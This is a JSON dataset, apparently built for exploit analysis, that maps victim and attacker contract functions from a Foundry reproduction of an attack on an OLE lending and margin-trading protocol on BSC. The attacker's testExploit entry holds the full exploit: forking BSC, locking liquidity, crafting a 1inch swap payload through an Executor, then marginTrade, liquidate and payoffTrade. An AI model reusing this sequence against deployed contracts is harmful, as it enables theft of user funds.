[
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "_acceptAdmin",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "_addReserves",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "_becomeImplementation",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "_delegateCompLikeTo",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "_reduceReserves",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "_resignImplementation",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "_setComptroller",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "_setInterestRateModel",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "_setPendingAdmin",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "_setReserveFactor",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "accrualBlockNumber",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "accrueInterest",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "admin",
    "original_code": "    function admin() external ifAdmin returns (address) {\n        return _admin();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "availableForBorrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "balanceOfUnderlying",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "borrowBalanceCurrent",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "borrowBalanceStored",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "borrowIndex",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "borrowRatePerBlock",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "comptroller",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "exchangeRateCurrent",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "exchangeRateStored",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "getAccountSnapshot",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "getCash",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "implementation",
    "original_code": "    function implementation() external ifAdmin returns (address) {\n        return _implementation();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "initialize",
    "original_code": "    function initialize(address underlying_,\n        bool isWethPool_,\n        address contoller_,\n        uint256 baseRatePerYear,\n        uint256 multiplierPerYear,\n        uint256 jumpMultiplierPerYear,\n        uint256 kink_,\n\n        uint initialExchangeRateMantissa_,\n        string memory name_,\n        string memory symbol_,\n        uint8 decimals_,\n        address payable admin_,\n        address implementation_) external onlyAdmin {\n        require(implementation == address(0), \"initialize once\");\n        // Creator of the contract is admin during initialization\n        // First delegate gets to initialize the delegator (i.e. storage contract)\n        delegateTo(implementation_, abi.encodeWithSignature(\"initialize(address,bool,address,uint256,uint256,uint256,uint256,uint256,string,string,uint8)\",\n            underlying_,\n            isWethPool_,\n            contoller_,\n            baseRatePerYear,\n            multiplierPerYear,\n            jumpMultiplierPerYear,\n            kink_,\n            initialExchangeRateMantissa_,\n            name_,\n            symbol_,\n            decimals_));\n\n        implementation = implementation_;\n\n        // Set the proper admin now that initialization is done\n        admin = admin_;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "interestRateModel",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "isCToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "liquidateBorrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(address to) external lock returns (uint liquidity) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        } else {\n            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n        }\n        require(liquidity > 0, 'Pancake: INSUFFICIENT_LIQUIDITY_MINTED');\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "pendingAdmin",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "protocolSeizeShareMantissa",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "redeemUnderlying",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "repayBorrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "repayBorrowBehalf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "reserveFactorMantissa",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "seize",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "supplyRatePerBlock",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "sweepToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "totalBorrows",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "totalBorrowsCurrent",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "totalReserves",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n\n\n// File @1inch/solidity-utils/contracts/interfaces/[email&#160;protected]\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILToken",
    "source_type": "victim_contract",
    "function_name": "underlying",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 37_470_328);\n        vm.label(address(ETH), \"ETH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(BTCB), \"BTCB\");\n        vm.label(address(BUSDT), \"BUSDT\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(OLE), \"OLE\");\n        vm.label(address(xOLE), \"xOLE\");\n        vm.label(address(USDC_OLE), \"USDC_OLE\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(TradeController), \"TradeController\");\n        vm.label(address(OPBorrowingDelegator), \"OPBorrowingDelegator\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // First TX\n        deal(address(this), 5 ether);\n        emit log_named_decimal_uint(\"Exploiter BNB balance before attack\", address(this).balance, 18);\n\n        USDC.approve(address(Router), type(uint256).max);\n        BUSDT.approve(address(Router), type(uint256).max);\n\n        WBNBToOLE();\n        // Add liquidity to pair\n        OLE.transfer(address(USDC_OLE), OLE.balanceOf(address(this)));\n        USDC.transfer(address(USDC_OLE), USDC.balanceOf(address(this)));\n        USDC_OLE.mint(address(this));\n\n        // Deposit and lock liquidity\n        USDC_OLE.approve(address(xOLE), USDC_OLE.balanceOf(address(this)));\n        xOLE.create_lock(1, 1_814_400 + block.timestamp);\n\n        (,,,, uint16 marginLimit, uint16 feesRate, uint16 priceDiffientRatio,,,) = TradeController.markets(marketId);\n        uint256 underlyingWBNBBal = LToken.getCash();\n        if (underlyingWBNBBal > 1e14) {\n            (bool success,) = address(LToken).call(abi.encodeWithSignature(\"accrueInterest()\"));\n            require(success, \"Call to accrueInterest() not successful\");\n            uint256 availableBorrow = LToken.availableForBorrow();\n\n            address[] memory path = new address[](3);\n            path[0] = address(WBNB);\n            path[1] = address(BUSDT);\n            path[2] = address(WBNB);\n            uint256[] memory amountsOut = Router.getAmountsOut(address(this).balance, path);\n            uint256 amountToBorrow = (amountsOut[2] * 3000) / marginLimit;\n            uint256[] memory amounts = WBNBToBUSDT();\n            BUSDT.approve(address(TradeController), amounts[1]);\n\n            Executor executor = new Executor();\n            SwapDescription memory desc = SwapDescription({\n                srcToken: address(WBNB),\n                dstToken: address(BUSDT),\n                srcReceiver: address(executor),\n                dstReceiver: address(TradeController),\n                amount: amountToBorrow,\n                minReturnAmount: 1,\n                flags: 4\n            });\n            bytes memory permit = \"\";\n            bytes memory data =\n                abi.encode(address(this), address(WBNB), address(BUSDT), 65_560, address(OPBorrowingDelegator));\n            bytes memory swapData = abi.encodeWithSelector(bytes4(0x12aa3caf), address(executor), desc, permit, data);\n\n            // First byte = Dex ID\n            bytes memory dexData = abi.encodePacked(bytes5(hex\"1500000002\"), swapData);\n\n            TradeController.marginTrade(marketId, true, true, amountsOut[1], amountToBorrow, 0, dexData);\n\n            OPBorrowingDelegator.liquidate(marketId, true, address(this));\n        }\n\n        // Second TX\n        vm.rollFork(37_470_331);\n\n        TradeController.markets(marketId);\n        TradeController.payoffTrade(marketId, true);\n        WBNB.withdraw(WBNB.balanceOf(address(this)));\n        BUSDTToWBNB();\n\n        emit log_named_decimal_uint(\"Exploiter BNB balance after attack\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IxOLE",
    "source_type": "victim_contract",
    "function_name": "create_lock",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IxOLE",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IxOLE",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IxOLE",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(LPoolInterface lpool, address account, uint256 amount) internal returns (bool)  {\n        bool updateSucceed = updateReward(lpool, account, false);\n        if (xoleToken == address(0)) {\n            return updateSucceed;\n        }\n        uint extraToken = lPoolRewardByAccounts[lpool][false][account].extraToken;\n        if (extraToken == 0) {\n            return updateSucceed;\n        }\n        uint oldBalance = lpool.balanceOf(account);\n        //withdraw all\n        if (oldBalance == amount) {\n            lPoolRewardByAccounts[lpool][false][account].extraToken = 0;\n            lpoolDistributions[lpool][false].extraTotalToken = lpoolDistributions[lpool][false].extraTotalToken.sub(extraToken);\n        } else {\n            uint subExtraToken = extraToken.mul(amount).div(oldBalance);\n            lPoolRewardByAccounts[lpool][false][account].extraToken = extraToken.sub(subExtraToken);\n            lpoolDistributions[lpool][false].extraTotalToken = lpoolDistributions[lpool][false].extraTotalToken.sub(subExtraToken);\n        }\n        return updateSucceed;\n    }\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "IOPBorrowingDelegator",
    "source_type": "victim_contract",
    "function_name": "liquidate",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Executor",
    "source_type": "victim_contract",
    "function_name": "execute",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ITradeController",
    "source_type": "victim_contract",
    "function_name": "activeTrades",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ITradeController",
    "source_type": "victim_contract",
    "function_name": "marginTrade",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ITradeController",
    "source_type": "victim_contract",
    "function_name": "markets",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ITradeController",
    "source_type": "victim_contract",
    "function_name": "payoffTrade",
    "original_code": "",
    "description": ""
  }
]